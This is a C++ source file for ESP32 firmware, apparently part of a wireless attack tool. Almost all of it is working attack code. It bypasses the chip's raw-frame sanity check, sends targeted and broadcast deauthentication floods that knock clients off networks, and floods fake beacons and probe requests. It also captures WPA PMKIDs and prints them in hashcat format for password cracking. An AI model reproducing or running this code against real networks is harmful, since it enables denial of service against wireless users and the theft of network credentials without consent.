#include "wifi_attack.h"

// Static member initialization
bool WiFiAttack::attacking = false;
int WiFiAttack::currentAttackType = -1;
int WiFiAttack::framesSent = 0;
int WiFiAttack::stationsEliminated = 0;
int WiFiAttack::currentChannel = 1;
deauth_frame_t WiFiAttack::deauthFrame;
pmkid_capture_t WiFiAttack::pmkidData;
unsigned long WiFiAttack::attackStartTime = 0;

// Beacon flooding state initialization
char WiFiAttack::beaconSSIDs[MAX_BEACON_SSIDS][33];
uint8_t WiFiAttack::beaconBSSIDs[MAX_BEACON_SSIDS][6];
int WiFiAttack::beaconSSIDCount = 0;
uint8_t WiFiAttack::beaconChannel = 6;
uint8_t WiFiAttack::beaconFrameBuffer[BEACON_FRAME_SIZE];

// Probe flooding state initialization
char WiFiAttack::probeTargetSSID[33];
uint8_t WiFiAttack::probeFrameBuffer[PROBE_FRAME_SIZE];

// PMKID capture state initialization
bool WiFiAttack::pmkidFound = false;
pmkid_capture_t WiFiAttack::pmkidHistory[MAX_PMKID_HISTORY];
int WiFiAttack::pmkidHistoryCount = 0;

// Bypass ESP32 WiFi frame sanity check (override library function)
extern "C" int __attribute__((weak)) ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// Declare external esp_wifi_80211_tx function
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void WiFiAttack::init() {
    attacking = false;
    currentAttackType = -1;
    framesSent = 0;
    stationsEliminated = 0;
    currentChannel = 1;
    memset(&deauthFrame, 0, sizeof(deauthFrame));
    memset(&pmkidData, 0, sizeof(pmkidData));
    Serial.println("[WiFiAttack] Initialized");
}

void WiFiAttack::deinit() {
    stopAttack();
    Serial.println("[WiFiAttack] Deinitialized");
}

// Helper function to properly configure WiFi for raw frame attacks
void WiFiAttack::setupWiFiForAttack(uint8_t channel) {
    // Disconnect from any existing network
    WiFi.disconnect();
    delay(10);

    // Disable softAP if active
    WiFi.softAPdisconnect(true);
    delay(10);

    // Set to pure STA mode (required for promiscuous mode)
    WiFi.mode(WIFI_MODE_STA);
    delay(100);

    // Set channel BEFORE enabling promiscuous mode
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    delay(10);

    Serial.printf("[WiFiAttack] WiFi configured for attack on channel %d\n", channel);
}

// Targeted deauthentication attack
void WiFiAttack::startDeauthTargeted(int wifi_index, uint16_t reason) {
    Serial.printf("[WiFiAttack] Starting targeted deauth on network: %s\n", WiFi.SSID(wifi_index).c_str());

    attacking = true;
    currentAttackType = ATTACK_DEAUTH_TARGETED;
    framesSent = 0;
    stationsEliminated = 0;
    attackStartTime = millis();

    // Setup deauth frame template
    deauthFrame.frame_control[0] = 0xC0;
    deauthFrame.frame_control[1] = 0x00;
    deauthFrame.fragment_sequence[0] = 0xF0;
    deauthFrame.fragment_sequence[1] = 0xFF;
    deauthFrame.reason = reason;

    // Copy target AP MAC addresses
    memcpy(deauthFrame.access_point, WiFi.BSSID(wifi_index), 6);
    memcpy(deauthFrame.sender, WiFi.BSSID(wifi_index), 6);

    // FIXED: Proper WiFi mode and channel setup
    currentChannel = WiFi.channel(wifi_index);
    setupWiFiForAttack(currentChannel);

    // Enable promiscuous mode to capture station MACs
    enablePromiscuous();
    esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);

    Serial.printf("[WiFiAttack] Deauth initialized on channel %d\n", currentChannel);
}

// Broadcast deauthentication attack (all networks)
void WiFiAttack::startDeauthBroadcast(uint16_t reason) {
    Serial.println("[WiFiAttack] Starting broadcast deauth on all networks");

    attacking = true;
    currentAttackType = ATTACK_DEAUTH_BROADCAST;
    framesSent = 0;
    stationsEliminated = 0;
    attackStartTime = millis();
    currentChannel = 1;  // Start on channel 1

    // Setup deauth frame template
    deauthFrame.frame_control[0] = 0xC0;
    deauthFrame.frame_control[1] = 0x00;
    deauthFrame.fragment_sequence[0] = 0xF0;
    deauthFrame.fragment_sequence[1] = 0xFF;
    deauthFrame.reason = reason;

    // FIXED: Proper WiFi mode setup
    setupWiFiForAttack(currentChannel);

    // Enable promiscuous mode
    enablePromiscuous();
    esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);

    Serial.println("[WiFiAttack] Broadcast deauth initialized, channel hopping enabled");
}

// Beacon flooding attack
void WiFiAttack::startBeaconFlood(const char** ssid_list, int count) {
    Serial.printf("[WiFiAttack] Starting beacon flood with %d fake APs\n", count);

    attacking = true;
    currentAttackType = ATTACK_BEACON_FLOOD;
    framesSent = 0;
    attackStartTime = millis();

    // Store SSID list and generate random BSSIDs
    beaconSSIDCount = min(count, MAX_BEACON_SSIDS);
    for (int i = 0; i < beaconSSIDCount; i++) {
        strncpy(beaconSSIDs[i], ssid_list[i], 32);
        beaconSSIDs[i][32] = '\0';  // Ensure null termination

        // Generate random BSSID (locally administered)
        for (int j = 0; j < 6; j++) {
            beaconBSSIDs[i][j] = esp_random() & 0xFF;
        }
        beaconBSSIDs[i][0] |= 0x02;  // Set locally administered bit
        beaconBSSIDs[i][0] &= 0xFE;  // Clear multicast bit
    }

    // Set channel and start AP mode
    beaconChannel = 6;
    WiFi.softAP("Starbeam-Beacon", "starbeam2024", beaconChannel);
    delay(100);

    Serial.printf("[WiFiAttack] Beacon flood initialized with %d APs on channel %d\n", beaconSSIDCount, beaconChannel);
}

// Probe request flooding
void WiFiAttack::startProbeFlood(const char* target_ssid) {
    Serial.printf("[WiFiAttack] Starting probe flood for SSID: %s\n", target_ssid ? target_ssid : "wildcard");

    attacking = true;
    currentAttackType = ATTACK_PROBE_FLOOD;
    framesSent = 0;
    attackStartTime = millis();

    // Store target SSID or set wildcard mode
    if (target_ssid && strlen(target_ssid) > 0) {
        strncpy(probeTargetSSID, target_ssid, 32);
        probeTargetSSID[32] = '\0';
    } else {
        probeTargetSSID[0] = '\0';  // Wildcard mode (empty SSID)
    }

    // Set to STA mode for probe transmission
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    delay(100);

    Serial.printf("[WiFiAttack] Probe flood initialized in %s mode\n",
                  probeTargetSSID[0] ? "targeted" : "wildcard");
}

// PMKID capture
void WiFiAttack::startPMKIDCapture(int wifi_index) {
    Serial.printf("[WiFiAttack] Starting PMKID capture on: %s\n", WiFi.SSID(wifi_index).c_str());

    attacking = true;
    currentAttackType = ATTACK_PMKID_CAPTURE;
    attackStartTime = millis();

    // Clear previous capture
    memset(&pmkidData, 0, sizeof(pmkidData));
    pmkidFound = false;

    // Set SSID and AP MAC
    strncpy(pmkidData.ssid, WiFi.SSID(wifi_index).c_str(), 32);
    pmkidData.ssid[32] = '\0';
    memcpy(pmkidData.ap_mac, WiFi.BSSID(wifi_index), 6);

    // FIXED: Setup WiFi mode and channel BEFORE promiscuous mode
    currentChannel = WiFi.channel(wifi_index);
    setupWiFiForAttack(currentChannel);

    // Enable promiscuous mode to capture EAPOL frames
    enablePromiscuous();
    esp_wifi_set_promiscuous_rx_cb(&pmkidSniffer);

    Serial.printf("[WiFiAttack] PMKID capture initialized on channel %d, listening for EAPOL frames\n", currentChannel);
}

void WiFiAttack::stopAttack() {
    if (!attacking) return;

    Serial.println("[WiFiAttack] Stopping attack");

    disablePromiscuous();
    attacking = false;
    currentAttackType = -1;
}

// Promiscuous mode deauth sniffer callback
void IRAM_ATTR WiFiAttack::deauthSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* raw_packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = raw_packet->payload;

    // Parse MAC header
    const uint8_t* dest = payload + 4;
    const uint8_t* src = payload + 10;
    const uint8_t* bssid = payload + 16;

    if (currentAttackType == ATTACK_DEAUTH_TARGETED) {
        // Targeted: Check if frame is destined for target AP
        if (memcmp(dest, deauthFrame.sender, 6) == 0) {
            // Found a station communicating with target AP
            memcpy(deauthFrame.station, src, 6);

            // FIXED: Use WIFI_IF_STA instead of WIFI_IF_AP
            for (int i = 0; i < NUM_FRAMES_PER_ATTACK; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
                framesSent++;
            }
            stationsEliminated++;
        }
    } else if (currentAttackType == ATTACK_DEAUTH_BROADCAST) {
        // Broadcast: Deauth any station→AP communication
        if ((memcmp(dest, bssid, 6) == 0) && (memcmp(dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
            memcpy(deauthFrame.station, src, 6);
            memcpy(deauthFrame.access_point, dest, 6);
            memcpy(deauthFrame.sender, dest, 6);

            for (int i = 0; i < NUM_FRAMES_PER_ATTACK; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
                framesSent++;
            }
        }
    }
}

// PMKID sniffer - Parse EAPOL frames to extract PMKID
void IRAM_ATTR WiFiAttack::pmkidSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (pmkidFound) return;  // Already captured

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (len < 100) return;  // Too short for EAPOL

    // Check frame type is DATA (0x08)
    uint8_t frame_type = (payload[0] & 0x0C) >> 2;
    if (frame_type != 2) return;

    // Extract MAC addresses from 802.11 header
    const uint8_t* bssid = payload + 16;
    if (memcmp(bssid, pmkidData.ap_mac, 6) != 0) return;  // Not target AP

    // Find LLC/SNAP header (24 bytes MAC header + potential 2 bytes QoS)
    int offset = 24;
    if ((payload[0] & 0x80) == 0x80) offset += 2;  // QoS present

    // Check for EAPOL ethertype (0x888E)
    if (offset + 8 > len) return;
    if (payload[offset + 6] != 0x88 || payload[offset + 7] != 0x8E) return;

    // Parse EAPOL header
    offset += 8;  // Skip LLC/SNAP
    if (offset + 4 > len) return;
    uint8_t eapol_type = payload[offset + 1];
    if (eapol_type != 0x03) return;  // Not EAPOL-Key

    // Parse Key Descriptor
    offset += 4;
    if (offset + 97 > len) return;
    uint8_t descriptor_type = payload[offset];
    uint16_t key_info = (payload[offset + 1] << 8) | payload[offset + 2];

    if (descriptor_type != 0x02) return;  // Not RSN Key

    // Check for Message 1 (Ack=1, Install=0, MIC=0)
    bool is_msg1 = (key_info & 0x0180) == 0x0080;
    if (!is_msg1) return;

    // Extract Key Data Length
    if (offset + 97 > len) return;
    uint16_t key_data_len = (payload[offset + 95] << 8) | payload[offset + 96];
    if (key_data_len == 0) return;
    if (offset + 97 + key_data_len > len) return;

    // Search for RSN IE (Tag 0x30) in Key Data
    int kd_offset = offset + 97;
    int kd_end = kd_offset + key_data_len;

    while (kd_offset < kd_end - 2 && kd_offset < len) {
        uint8_t tag = payload[kd_offset];
        uint8_t tag_len = payload[kd_offset + 1];

        if (kd_offset + 2 + tag_len > kd_end || kd_offset + 2 + tag_len > len) {
            break;  // Invalid tag length
        }

        if (tag == 0x30) {  // RSN IE
            int rsn_off = kd_offset + 2;

            // Skip version (2 bytes) + group cipher (4 bytes)
            rsn_off += 6;
            if (rsn_off + 2 > kd_end) break;

            // Skip pairwise cipher suites
            uint16_t pc_count = payload[rsn_off] | (payload[rsn_off + 1] << 8);
            rsn_off += 2 + (pc_count * 4);
            if (rsn_off + 2 > kd_end) break;

            // Skip AKM suites
            uint16_t akm_count = payload[rsn_off] | (payload[rsn_off + 1] << 8);
            rsn_off += 2 + (akm_count * 4);
            if (rsn_off + 2 > kd_end) break;

            // Skip RSN capabilities
            rsn_off += 2;

            // Check PMKID count
            if (rsn_off + 2 <= kd_end && rsn_off + 2 <= len) {
                uint16_t pmkid_count = payload[rsn_off] | (payload[rsn_off + 1] << 8);
                rsn_off += 2;

                if (pmkid_count == 1 && rsn_off + 16 <= kd_end && rsn_off + 16 <= len) {
                    // PMKID FOUND!
                    memcpy(pmkidData.pmkid, payload + rsn_off, 16);
                    memcpy(pmkidData.station_mac, payload + 10, 6);  // Source MAC from 802.11 header
                    pmkidData.timestamp = millis();
                    pmkidData.valid = true;
                    pmkidFound = true;

                    // Add to history
                    WiFiAttack::addPMKIDToHistory(&pmkidData);

                    // Print hashcat format to serial
                    Serial.println("\n[WiFiAttack] PMKID CAPTURED!");
                    Serial.print("Hashcat format: ");
                    for (int i = 0; i < 16; i++) {
                        Serial.printf("%02x", pmkidData.pmkid[i]);
                    }
                    Serial.print("*");
                    for (int i = 0; i < 6; i++) {
                        Serial.printf("%02x", pmkidData.ap_mac[i]);
                    }
                    Serial.print("*");
                    for (int i = 0; i < 6; i++) {
                        Serial.printf("%02x", pmkidData.station_mac[i]);
                    }
                    Serial.print("*");
                    Serial.println(pmkidData.ssid);

                    return;
                }
            }
        }
        kd_offset += 2 + tag_len;
    }
}

void WiFiAttack::buildDeauthFrame(uint8_t* station, uint8_t* ap, uint16_t reason) {
    // Frame building helper (currently inline in start functions)
}

void WiFiAttack::buildBeaconFrame(int ap_index) {
    uint8_t* buf = beaconFrameBuffer;
    int offset = 0;

    // MAC Header (24 bytes)
    buf[offset++] = 0x80; buf[offset++] = 0x00;  // Frame control (beacon)
    buf[offset++] = 0x00; buf[offset++] = 0x00;  // Duration
    memset(buf + offset, 0xFF, 6); offset += 6;  // Destination (broadcast)
    memcpy(buf + offset, beaconBSSIDs[ap_index], 6); offset += 6;  // Source MAC
    memcpy(buf + offset, beaconBSSIDs[ap_index], 6); offset += 6;  // BSSID

    // Sequence number
    static uint16_t seq = 0;
    buf[offset++] = (seq << 4) & 0xFF;
    buf[offset++] = (seq >> 4) & 0xFF;
    seq++;
    if (seq > 4095) seq = 0;

    // Fixed Parameters (12 bytes)
    uint64_t timestamp = millis() * 1000;
    memcpy(buf + offset, &timestamp, 8); offset += 8;
    buf[offset++] = BEACON_INTERVAL_TU & 0xFF;
    buf[offset++] = (BEACON_INTERVAL_TU >> 8) & 0xFF;
    buf[offset++] = 0x21; buf[offset++] = 0x04;  // Capability info

    // SSID IE (Tag 0)
    int ssid_len = strlen(beaconSSIDs[ap_index]);
    buf[offset++] = 0x00;  // Tag: SSID
    buf[offset++] = ssid_len;  // Length
    memcpy(buf + offset, beaconSSIDs[ap_index], ssid_len);
    offset += ssid_len;

    // Supported Rates IE (Tag 1)
    buf[offset++] = 0x01;  // Tag: Supported Rates
    buf[offset++] = 0x08;  // Length
    buf[offset++] = 0x82;  // 1 Mbps (basic)
    buf[offset++] = 0x84;  // 2 Mbps (basic)
    buf[offset++] = 0x8b;  // 5.5 Mbps (basic)
    buf[offset++] = 0x96;  // 11 Mbps (basic)
    buf[offset++] = 0x0c;  // 6 Mbps
    buf[offset++] = 0x12;  // 9 Mbps
    buf[offset++] = 0x18;  // 12 Mbps
    buf[offset++] = 0x24;  // 18 Mbps

    // DS Parameter Set IE (Tag 3)
    buf[offset++] = 0x03;  // Tag: DS Parameter
    buf[offset++] = 0x01;  // Length
    buf[offset++] = beaconChannel;  // Current channel

    // Transmit the beacon frame
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrameBuffer, offset, false);
    framesSent++;
}

void WiFiAttack::buildProbeFrame() {
    uint8_t* buf = probeFrameBuffer;
    int offset = 0;

    // MAC Header (24 bytes)
    buf[offset++] = 0x40; buf[offset++] = 0x00;  // Frame control (probe request)
    buf[offset++] = 0x00; buf[offset++] = 0x00;  // Duration
    memset(buf + offset, 0xFF, 6); offset += 6;  // Destination (broadcast)

    // Random source MAC (locally administered, unicast)
    for (int i = 0; i < 6; i++) {
        buf[offset++] = esp_random() & 0xFF;
    }
    buf[offset - 6] |= 0x02;  // Set locally administered bit
    buf[offset - 6] &= 0xFE;  // Clear multicast bit

    memset(buf + offset, 0xFF, 6); offset += 6;  // BSSID (broadcast)

    // Sequence number
    static uint16_t seq = 0;
    buf[offset++] = (seq << 4) & 0xFF;
    buf[offset++] = (seq >> 4) & 0xFF;
    seq++;
    if (seq > 4095) seq = 0;

    // SSID IE (Tag 0)
    int ssid_len = strlen(probeTargetSSID);
    buf[offset++] = 0x00;  // Tag: SSID
    buf[offset++] = ssid_len;  // Length (0 for wildcard)
    if (ssid_len > 0) {
        memcpy(buf + offset, probeTargetSSID, ssid_len);
        offset += ssid_len;
    }

    // Supported Rates IE (Tag 1)
    buf[offset++] = 0x01;  // Tag: Supported Rates
    buf[offset++] = 0x08;  // Length
    buf[offset++] = 0x82;  // 1 Mbps (basic)
    buf[offset++] = 0x84;  // 2 Mbps (basic)
    buf[offset++] = 0x8b;  // 5.5 Mbps (basic)
    buf[offset++] = 0x96;  // 11 Mbps (basic)
    buf[offset++] = 0x0c;  // 6 Mbps
    buf[offset++] = 0x12;  // 9 Mbps
    buf[offset++] = 0x18;  // 12 Mbps
    buf[offset++] = 0x24;  // 18 Mbps

    // Transmit the probe request frame
    esp_wifi_80211_tx(WIFI_IF_STA, probeFrameBuffer, offset, false);
    framesSent++;
}

void WiFiAttack::enablePromiscuous() {
    const wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filter);
}

void WiFiAttack::disablePromiscuous() {
    esp_wifi_set_promiscuous(false);
}

void WiFiAttack::channelHop() {
    if (currentChannel > 13) currentChannel = 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    currentChannel++;
}

// PMKID history management
const pmkid_capture_t* WiFiAttack::getPMKIDHistory(int index) {
    if (index < 0 || index >= pmkidHistoryCount) {
        return nullptr;
    }
    return &pmkidHistory[index];
}

void WiFiAttack::clearPMKIDHistory() {
    pmkidHistoryCount = 0;
    memset(pmkidHistory, 0, sizeof(pmkidHistory));
    Serial.println("[WiFiAttack] PMKID history cleared");
}

// Helper function to add PMKID to history
void WiFiAttack::addPMKIDToHistory(const pmkid_capture_t* capture) {
    // Shift existing entries if buffer is full
    if (pmkidHistoryCount >= MAX_PMKID_HISTORY) {
        for (int i = 0; i < MAX_PMKID_HISTORY - 1; i++) {
            memcpy(&pmkidHistory[i], &pmkidHistory[i + 1], sizeof(pmkid_capture_t));
        }
        pmkidHistoryCount = MAX_PMKID_HISTORY - 1;
    }

    // Add new capture to end
    memcpy(&pmkidHistory[pmkidHistoryCount], capture, sizeof(pmkid_capture_t));
    pmkidHistoryCount++;
}
